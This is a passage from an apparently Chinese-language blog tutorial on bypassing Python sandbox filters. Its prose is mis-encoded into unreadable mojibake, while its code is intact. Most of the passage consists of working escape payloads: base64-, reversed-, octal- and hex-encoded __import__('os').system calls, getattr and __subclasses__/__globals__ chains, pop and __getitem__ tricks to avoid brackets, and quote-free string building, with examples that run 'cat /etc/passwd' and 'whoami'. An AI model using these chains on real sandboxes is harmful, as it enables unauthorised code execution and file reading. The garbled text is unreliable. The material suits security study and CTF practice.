<p>å½“ç„¶ï¼Œå¦‚æœè¿‡æ»¤çš„æ˜¯ <code>__class__</code> æˆ–è€… <code>__mro__</code> è¿™æ ·çš„å±æ€§åï¼Œå°±æ— æ³•é‡‡ç”¨å˜å½¢æ¥ç»•è¿‡äº†ã€‚</p>
<h3 id="base64-å˜å½¢"><a href="#base64-å˜å½¢" class="headerlink" title="base64 å˜å½¢"></a>base64 å˜å½¢</h3><p>base64 ä¹Ÿå¯ä»¥è¿ç”¨åˆ°å…¶ä¸­</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;__import__&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)](<span class="string">&#x27;b3M=&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h3 id="é€†åº"><a href="#é€†åº" class="headerlink" title="é€†åº"></a>é€†åº</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">kali</span><br></pre></td></tr></table></figure></div>

<h3 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h3><p>å…«è¿›åˆ¶ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\<span class="subst">&#123;<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div>

<p>åå…­è¿›åˆ¶ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>exp:</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))&quot;</span></span><br><span class="line">octal_string = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;\\x<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]&#125;</span>&quot;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span>(octal_string)</span><br></pre></td></tr></table></figure></div>

<h3 id="å…¶ä»–ç¼–ç "><a href="#å…¶ä»–ç¼–ç " class="headerlink" title="å…¶ä»–ç¼–ç "></a>å…¶ä»–ç¼–ç </h3><p>hexã€rot13ã€base32 ç­‰ã€‚</p>
<h2 id="è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å"><a href="#è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å" class="headerlink" title="è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å"></a>è¿‡æ»¤äº†å±æ€§åæˆ–è€…å‡½æ•°å</h2><p>åœ¨ payload çš„æ„é€ ä¸­ï¼Œæˆ‘ä»¬å¤§é‡çš„ä½¿ç”¨äº†å„ç§ç±»ä¸­çš„å±æ€§ï¼Œä¾‹å¦‚ <code>__class__</code>ã€<code>__import__</code> ç­‰ã€‚</p>
<h3 id="getattr-å‡½æ•°"><a href="#getattr-å‡½æ•°" class="headerlink" title="getattr å‡½æ•°"></a>getattr å‡½æ•°</h3><p>getattr æ˜¯ Python çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æˆ–è€…æ–¹æ³•ã€‚å…¶è¯­æ³•å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>(<span class="built_in">object</span>, name[, default])</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œï¼Œobject æ˜¯å¯¹è±¡ï¼Œname æ˜¯å­—ç¬¦ä¸²ï¼Œä»£è¡¨è¦è·å–çš„å±æ€§çš„åç§°ã€‚å¦‚æœæä¾›äº† default å‚æ•°ï¼Œå½“å±æ€§ä¸å­˜åœ¨æ—¶ä¼šè¿”å›è¿™ä¸ªå€¼ï¼Œå¦åˆ™ä¼šæŠ›å‡º AttributeErrorã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·ä¸€æ¥ï¼Œå°±å¯ä»¥å°† payload ä¸­çš„å±æ€§åè½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„å˜æ¢æ–¹å¼å¤šç§å¤šæ ·ï¼Œæ›´æ˜“äºç»•è¿‡é»‘åå•ã€‚</p>
<h3 id="getattribute-å‡½æ•°"><a href="#getattribute-å‡½æ•°" class="headerlink" title="__getattribute__ å‡½æ•°"></a><code>__getattribute__</code> å‡½æ•°</h3><p><code>__getattribute__</code> äºï¼Œå®ƒå®šä¹‰äº†å½“æˆ‘ä»¬å°è¯•è·å–ä¸€ä¸ªå¯¹è±¡çš„å±æ€§æ—¶åº”è¯¥è¿›è¡Œçš„æ“ä½œã€‚</p>
<p>å®ƒçš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattribute__</span>(<span class="params">self, name</span>):</span><br></pre></td></tr></table></figure></div>

<p><code>getattr</code> å‡½æ•°åœ¨è°ƒç”¨æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„ <code>__getattribute__</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="getattr-å‡½æ•°-1"><a href="#getattr-å‡½æ•°-1" class="headerlink" title="__getattr__ å‡½æ•°"></a><code>__getattr__</code> å‡½æ•°</h3><p><code>__getattr__</code> æ˜¯ Python çš„ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼Œå½“å°è¯•è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œå®ƒå°±ä¼šè¢«è°ƒç”¨ã€‚å®ƒå…è®¸ä¸€ä¸ªå¯¹è±¡åŠ¨æ€åœ°è¿”å›ä¸€ä¸ªå±æ€§å€¼ï¼Œæˆ–è€…æŠ›å‡ºä¸€ä¸ª <code>AttributeError</code> å¼‚å¸¸ã€‚</p>
<p>å¦‚ä¸‹æ˜¯ <code>__getattr__</code> æ–¹æ³•çš„åŸºæœ¬å½¢å¼ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure></div>

<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»»ä½•ä½ å°è¯•è®¿é—®çš„ä¸å­˜åœ¨çš„å±æ€§éƒ½ä¼šè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå½¢å¦‚ â€œYou tried to get Xâ€ï¼Œå…¶ä¸­ X æ˜¯ä½ å°è¯•è®¿é—®çš„å±æ€§åã€‚</p>
<p>ä¸ <code>__getattribute__</code> ä¸åŒï¼Œ<code>__getattr__</code> åªæœ‰åœ¨å±æ€§æŸ¥æ‰¾å¤±è´¥æ—¶æ‰ä¼šè¢«è°ƒç”¨ï¼Œè¿™ä½¿å¾— <code>__getattribute__</code> å¯ä»¥ç”¨æ¥æ›´ä¸ºå…¨é¢åœ°æ§åˆ¶å±æ€§è®¿é—®ã€‚</p>
<p>å¦‚æœåœ¨ä¸€ä¸ªç±»ä¸­åŒæ—¶å®šä¹‰äº† <code>__getattr__</code> å’Œ <code>__getattribute__</code>ï¼Œé‚£ä¹ˆæ— è®ºå±æ€§æ˜¯å¦å­˜åœ¨ï¼Œ<code>__getattribute__</code> éƒ½ä¼šè¢«é¦–å…ˆè°ƒç”¨ã€‚åªæœ‰å½“ <code>__getattribute__</code> æŠ›å‡º <code>AttributeError</code> å¼‚å¸¸æ—¶ï¼Œ<code>__getattr__</code> æ‰ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>å¦å¤–ï¼Œæ‰€æœ‰çš„ç±»éƒ½ä¼šæœ‰<code>__getattribute__</code>å±æ€§ï¼Œè€Œä¸ä¸€å®šæœ‰<code>__getattr__</code>å±æ€§ã€‚</p>
<h3 id="globals-æ›¿æ¢"><a href="#globals-æ›¿æ¢" class="headerlink" title="__globals__ æ›¿æ¢"></a><code>__globals__</code> æ›¿æ¢</h3><p>åœ¨ Python2 <code>__globals__</code> å¯ä»¥ç”¨ <code>func_globals</code> ç›´æ¥æ›¿æ¢ï¼›</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="mro-ã€-bases-ã€-base-äº’æ¢"><a href="#mro-ã€-bases-ã€-base-äº’æ¢" class="headerlink" title="__mro__ã€__bases__ã€__base__ äº’æ¢"></a><code>__mro__</code>ã€<code>__bases__</code>ã€<code>__base__</code> äº’æ¢</h3><p>ä¸‰è€…ä¹‹é—´å¯ä»¥ç›¸äº’æ›¿æ¢</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">().__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure></div>

<h2 id="è¿‡æ»¤-import"><a href="#è¿‡æ»¤-import" class="headerlink" title="è¿‡æ»¤ import"></a>è¿‡æ»¤ import</h2><p>python ä¸­é™¤äº†å¯ä»¥ä½¿ç”¨ import æ¥å¯¼å…¥ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <code>__import__</code> å’Œ <code>importlib.import_module</code> æ¥å¯¼å…¥æ¨¡å—</p>
<h3 id="import-1"><a href="#import-1" class="headerlink" title="__import__"></a><code>__import__</code></h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="importlib-import-module"><a href="#importlib-import-module" class="headerlink" title="importlib.import_module"></a><code>importlib.import_module</code></h3><p><code>importlib</code> æ˜¯ Python çš„<strong>å¯¼å…¥æœºåˆ¶æ¥å£</strong>æ¨¡å—ï¼Œé‡Œé¢çš„ <code>import_module()</code> å‡½æ•°ç›¸å½“äºåŠ¨æ€ç‰ˆçš„ <code>import</code> è¯­å¥ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸º <code>importlib</code> <strong>ä¸æ˜¯å†…å»ºçš„åå­—</strong>ï¼Œå®ƒæœ¬èº«éœ€è¦å…ˆ <code>import importlib</code> æ‰èƒ½ç”¨ï¼Œæ‰€ä»¥æœ‰äº›é¸¡è‚‹ã€‚</p>
<h3 id="loader-load-module"><a href="#loader-load-module" class="headerlink" title="__loader__.load_module"></a><code>__loader__.load_module</code></h3><p><code>__loader__</code> çš„ <strong><code>load_module(name)</code> æ˜¯è€æ¥å£</strong>ï¼ˆPEP 302 æ—¶ä»£ï¼ŒPy3.4 å‰ï¼‰ï¼Œç°åœ¨<strong>åªåœ¨å°‘æ•°åŠ è½½å™¨ï¼ˆå†…å»º&#x2F;å†»ç»“ï¼‰è¿˜ç•™äº†å…¼å®¹å±‚</strong>ï¼›å¤šæ•°ç°ä»£åŠ è½½å™¨ä¸å†æä¾›å®ƒã€‚</p>
<p><code>__builtins__</code> çš„  <code>__loader__</code> é€šå¸¸æ˜¯ <strong><code>BuiltinImporter</code> &#x2F; <code>FrozenImporter</code><strong>ï¼Œ</strong>åªä¼šåŠ è½½å†…å»º&#x2F;å†»ç»“æ¨¡å—</strong>ï¼Œä¾‹å¦‚ <code>sys</code>ï¼Œ<code>gc</code> ç­‰ï¼Œä½†æ˜¯åƒ <code>os</code> æ˜¯<strong>æ ‡å‡†åº“çš„çº¯ Python æ¨¡å—</strong>ï¼Œ<strong>ä¸åœ¨</strong>å®ƒçš„èƒ½åŠ›èŒƒå›´å†…ã€‚</p>
<p>å…·ä½“ç»†èŠ‚è§<strong>ç»•è¿‡ audit hook</strong> éƒ¨åˆ†ã€‚</p>
<h2 id="è¿‡æ»¤äº†"><a href="#è¿‡æ»¤äº†" class="headerlink" title="è¿‡æ»¤äº† []"></a>è¿‡æ»¤äº† []</h2><p>å¦‚æœä¸­æ‹¬å·è¢«è¿‡æ»¤äº†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„ä¸¤ç§æ–¹å¼æ¥ç»•è¿‡ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">200</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h3><p>è°ƒç”¨ <code>__getitem__()</code> å‡½æ•°ç›´æ¥æ›¿æ¢ï¼›</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># __getitem__()æ›¿æ¢ä¸­æ‹¬å·[]</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">((imp := (<span class="built_in">getattr</span>((b := (<span class="built_in">next</span>(c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__() <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="built_in">getattr</span>(c,<span class="string">&#x27;__init__&#x27;</span>,<span class="literal">None</span>),<span class="string">&#x27;__globals__&#x27;</span>))).__init__.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)), <span class="string">&#x27;__import__&#x27;</span>, <span class="literal">None</span>) <span class="keyword">or</span> (<span class="built_in">getattr</span>(b,<span class="string">&#x27;get&#x27;</span>,<span class="literal">None</span>) <span class="keyword">and</span> b.get(<span class="string">&#x27;__import__&#x27;</span>)))))(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a><code>pop</code></h3><p><code>pop()</code> æ–¹æ³•æ—¢èƒ½<strong>å–å€¼</strong>ï¼Œåˆä¼š<strong>ç§»é™¤</strong>ç›®æ ‡å…ƒç´ ï¼Œå¯ä»¥ç”¨æ¥æ›¿ä»£è¢«è¿‡æ»¤æ‰çš„ä¸­æ‹¬å·è®¿é—®ã€‚</p>
<ul>
<li><strong>åˆ—è¡¨ï¼ˆlistï¼‰</strong>ï¼š<code>lst.pop(i)</code> â†’ å–å‡ºå¹¶åˆ é™¤æŒ‡å®šç´¢å¼•çš„å…ƒç´ ï¼ˆé»˜è®¤åˆ é™¤æœ€åä¸€ä¸ªï¼‰ã€‚</li>
<li><strong>å­—å…¸ï¼ˆdictï¼‰</strong>ï¼š<code>dict.pop(key)</code> â†’ å–å‡ºå¹¶åˆ é™¤æŒ‡å®šé”®çš„å€¼ã€‚</li>
</ul>
<p>åœ¨æ²™ç®±é€ƒé€¸é“¾ä¸­ï¼Œå¦‚æœ <code>[]</code> è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨ <code>pop()</code> å–ä»£ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”¨ pop() å–ä»£ä¸‹æ ‡å’Œå–é”®ï¼Œç»“åˆ __getitem__() å®Œæˆé“¾è·¯</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().pop(<span class="number">200</span>).__init__.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>).pop(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…æ··åˆä½¿ç”¨ __getitem__() ä¸ getattr()</span></span><br><span class="line"><span class="built_in">getattr</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(-<span class="number">1</span>).__subclasses__().__getitem__(<span class="number">200</span>).__init__.__globals__,<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;__import__&#x27;</span>)(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>pop</code> ä¼šæŠŠæ¡ç›®<strong>åˆ æ‰</strong>ã€‚æ¯”å¦‚ä½  <code>__globals__.pop(&#39;__builtins__&#39;)</code>ï¼Œåç»­ç¯å¢ƒå°±å°‘äº†å†…å»ºç»‘å®šï¼Œå¯èƒ½å¯¼è‡´åç»­è¡¨è¾¾å¼æˆ–æ¨¡å—åŠ è½½è¡Œä¸ºå¼‚å¸¸ã€‚</p>

    </div>
  </div>

<h2 id="è¿‡æ»¤äº†-1"><a href="#è¿‡æ»¤äº†-1" class="headerlink" title="è¿‡æ»¤äº† &#39;&#39;"></a>è¿‡æ»¤äº† <code>&#39;&#39;</code></h2><h3 id="str-å‡½æ•°"><a href="#str-å‡½æ•°" class="headerlink" title="str å‡½æ•°"></a>str å‡½æ•°</h3><p>å¦‚æœè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ payload ä¸­æ„é€ çš„å­—ç¬¦ä¸²ä¼šå—åˆ°å½±å“ã€‚å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨ <code>str()</code> å‡½æ•°è·å–å­—ç¬¦ä¸²ï¼Œç„¶åç´¢å¼•åˆ°é¢„æœŸçš„å­—ç¬¦ã€‚å°†æ‰€æœ‰çš„å­—ç¬¦è¿æ¥èµ·æ¥å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆçš„å­—ç¬¦ä¸²ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div>

<h3 id="chr-å‡½æ•°"><a href="#chr-å‡½æ•°" class="headerlink" title="chr å‡½æ•°"></a>chr å‡½æ•°</h3><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ chr åŠ æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²</p>
